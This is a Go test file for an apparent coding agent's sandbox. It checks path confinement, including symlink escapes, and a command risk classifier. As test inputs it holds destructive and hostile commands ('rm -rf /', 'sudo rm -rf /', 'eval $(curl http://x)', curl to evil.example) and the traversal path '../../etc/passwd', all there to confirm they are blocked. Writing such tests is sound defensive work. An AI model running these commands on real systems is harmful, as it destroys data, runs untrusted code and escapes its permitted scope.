// Tests for the sandbox (File 08 §8.4): path confinement keeps every Read/
// Write/Grep/Glob inside the repo root (escapes surface as ErrPathEscapes, a
// normal error, never a panic); the command classifier peels sudo/env/time
// wrappers and sorts a command into allow/deny against the shell-escape,
// network, and disk-heavy classes. The Read built-in drives Resolve end-to-end.

package exec

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/baobao1044/yolo-code/internal/event"
)

// newSandbox makes a Sandbox rooted at a fresh tempdir with an "inside.txt"
// and a "sub/" subdir, so the inside/outside cases share a fixture.
func newSandbox(t *testing.T) *Sandbox {
	t.Helper()
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "inside.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(filepath.Join(root, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	// Through NewSandbox, not a struct literal. Production has exactly one
	// constructor and it normalizes root and cwd through EvalSymlinks, so a
	// literal builds a Sandbox in a state production can never produce — and
	// then every assertion below is about that fiction.
	//
	// It is not hypothetical. On macOS t.TempDir() hands back a path under
	// /var, which is a symlink to /private/var. Resolve flattens the path it is
	// given and compares the result against root, so with an unnormalized root
	// every single path read as an escape: five tests across this package failed
	// on macos-latest and only there, for a reason that has nothing to do with
	// what they were written to check. Worse, the tests that *expect* an escape
	// kept passing — for entirely the wrong reason. `TMPDIR=<a symlink> go test
	// ./internal/exec/` reproduces the whole thing on Linux; see
	// TestSandboxRootReachedThroughASymlink for it pinned as a standing guard.
	return NewSandbox(root, root)
}

func TestSandboxResolveRejectsEscape(t *testing.T) {
	s := newSandbox(t)

	outside, err := s.Resolve("../../etc/passwd")
	if err == nil {
		t.Fatalf("Resolve(../../etc/passwd) = %q, want ErrPathEscapes", outside)
	}
	if !strings.Contains(err.Error(), "escape") && err != ErrPathEscapes {
		t.Fatalf("Resolve escape err = %q, want ErrPathEscapes", err.Error())
	}

	inside, err := s.Resolve("inside.txt")
	if err != nil {
		t.Fatalf("Resolve(inside.txt) = %v, want nil", err)
	}
	if !strings.HasPrefix(inside, s.root) {
		t.Fatalf("Resolve(inside.txt) = %q, want it under root %q", inside, s.root)
	}
}

func TestSandboxResolveAbsoluteInsideRoot(t *testing.T) {
	s := newSandbox(t)

	// An absolute path that resolves under the root must be allowed.
	abs := filepath.Join(s.root, "sub", "deep.txt")
	if err := os.WriteFile(abs, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	got, err := s.Resolve(abs)
	if err != nil {
		t.Fatalf("Resolve(abs inside root) = %v, want nil", err)
	}
	if got != abs {
		t.Fatalf("Resolve(abs) = %q, want %q (EvalSymlinks of a real path)", got, abs)
	}
}

func TestSandboxResolveAbsoluteOutsideRoot(t *testing.T) {
	s := newSandbox(t)

	// Pick an absolute path that is genuinely outside the root on every host.
	// On Windows a Unix-style "/etc/passwd" is *relative* (IsAbs=false) and
	// would join under cwd, masking an escape — so use the host's temp dir as
	// the outside anchor and assert it is not under the sandbox root.
	outside := os.TempDir()
	if strings.HasPrefix(filepath.Clean(outside), filepath.Clean(s.root)) {
		// The host temp happens to contain the sandbox temp; walk up one level.
		outside = filepath.Dir(outside)
	}
	outside = filepath.Join(outside, "outside.txt")

	_, err := s.Resolve(outside)
	if err == nil {
		t.Fatalf("Resolve(%q) = nil, want ErrPathEscapes (absolute path outside root)", outside)
	}
}

func TestSandboxResolveSymlinkEscape(t *testing.T) {
	s := newSandbox(t)

	// A symlink inside the repo that points outside must be rejected —
	// EvalSymlinks flattens it before the Rel confinement check.
	target := t.TempDir() // outside root
	link := filepath.Join(s.root, "escape.link")
	if err := os.Symlink(target, link); err != nil {
		// Symlinks need elevated perms on some Windows setups; skip, don't fail.
		t.Skipf("cannot create symlink on this host: %v", err)
	}
	_, err := s.Resolve("escape.link")
	if err == nil {
		t.Fatal("Resolve(symlink → outside) = nil, want ErrPathEscapes")
	}
}

func TestSandboxRootReachedThroughASymlink(t *testing.T) {
	// A repo root reached through a symlink is ordinary, not exotic: macOS hands
	// out /var/... tempdirs that are really /private/var/..., and plenty of Linux
	// setups symlink a home or a mount point. Resolve flattens the path it is
	// given and compares the result against s.root, so if root itself is left
	// un-flattened the two sides can never match and *every* path inside the repo
	// reads as an escape — the sandbox denies the whole repo it is guarding.
	//
	// NewSandbox is what prevents that, and this test is the only thing holding
	// it there: delete either EvalSymlinks call in NewSandbox and this goes red
	// on every platform, which is the point. The five macOS-only failures that
	// prompted this test were the same defect, arriving by luck of the tempdir.
	// Flatten the tempdir before building anything under it: on a host whose
	// TMPDIR is itself a symlink (macOS always, Linux when TMPDIR says so) the
	// want-values below would otherwise be spelled in un-flattened terms and the
	// test would fail on its own expectations rather than on the sandbox.
	base, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	real := filepath.Join(base, "realroot")
	if err := os.Mkdir(real, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(real, "inside.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(base, "link")
	if err := os.Symlink(real, link); err != nil {
		// Symlinks need elevated perms on some Windows setups; skip, don't fail.
		t.Skipf("cannot create symlink on this host: %v", err)
	}

	s := NewSandbox(link, link)

	// An existing file — confine's EvalSymlinks branch.
	got, err := s.Resolve("inside.txt")
	if err != nil {
		t.Fatalf("Resolve(inside.txt) through a symlinked root = %v, want nil", err)
	}
	if want := filepath.Join(real, "inside.txt"); got != want {
		t.Fatalf("Resolve(inside.txt) = %q, want %q (flattened to the real root)", got, want)
	}

	// A file that does not exist yet — containedPath's branch, a separate code
	// path with the same exposure.
	got, err = s.Resolve("not-yet.txt")
	if err != nil {
		t.Fatalf("Resolve(not-yet.txt) through a symlinked root = %v, want nil", err)
	}
	if want := filepath.Join(real, "not-yet.txt"); got != want {
		t.Fatalf("Resolve(not-yet.txt) = %q, want %q", got, want)
	}

	// And confinement still holds — a test that only asserted the two lines
	// above would also pass if someone "fixed" this by dropping the check.
	if _, err := s.Resolve(filepath.Join(base, "sibling.txt")); err == nil {
		t.Fatal("Resolve(path outside the symlinked root) = nil, want ErrPathEscapes")
	}
}

func TestCommandAllowlistDeniesRmRf(t *testing.T) {
	s := newSandbox(t)

	if r := s.Classify("rm -rf /"); r != RiskCritical {
		t.Fatalf("Classify(rm -rf /) = %q, want critical (disk-heavy/root destroy)", r)
	}
	if r := s.Classify("ls"); r != RiskLow {
		t.Fatalf("Classify(ls) = %q, want low (safe read)", r)
	}
	if r := s.Classify("go test"); r != RiskLow {
		t.Fatalf("Classify(go test) = %q, want low (build/test)", r)
	}
	if r := s.Classify("curl http://evil.example"); r != RiskHigh {
		t.Fatalf("Classify(curl) = %q, want high (network, no allow-net)", r)
	}
	if r := s.Classify("eval $(curl http://x)"); r != RiskCritical {
		t.Fatalf("Classify(eval …) = %q, want critical (shell-escape)", r)
	}
}

func TestCommandClassifyPeelsWrappers(t *testing.T) {
	s := newSandbox(t)

	// `sudo rm -rf /` must still be critical — the classifier peels sudo before
	// re-matching, so a wrapper cannot launder a dangerous command.
	if r := s.Classify("sudo rm -rf /"); r != RiskCritical {
		t.Fatalf("Classify(sudo rm -rf /) = %q, want critical (wrapper peeled)", r)
	}
	// `env ls` is still safe — peeling env leaves the safe command.
	if r := s.Classify("env ls"); r != RiskLow {
		t.Fatalf("Classify(env ls) = %q, want low (env peeled)", r)
	}
}

func TestReadToolReadsFile(t *testing.T) {
	s := newSandbox(t)
	read := NewRead(s)

	out, err := read.Run(context.Background(), ToolInput{Args: []byte(`{"file":"inside.txt"}`)})
	if err != nil {
		t.Fatalf("Read(inside.txt) = %v, want nil", err)
	}
	if !strings.Contains(out.Stdout, "hi") {
		t.Fatalf("Read stdout = %q, want the file contents", out.Stdout)
	}
}

func TestReadToolRejectsEscape(t *testing.T) {
	s := newSandbox(t)
	read := NewRead(s)

	_, err := read.Run(context.Background(), ToolInput{Args: []byte(`{"file":"../../etc/passwd"}`)})
	if err == nil {
		t.Fatal("Read(../../etc/passwd) = nil, want ErrPathEscapes")
	}
}

// ensure event import stays used (Risk consts reference it across tickets).
var _ = event.Risk("")
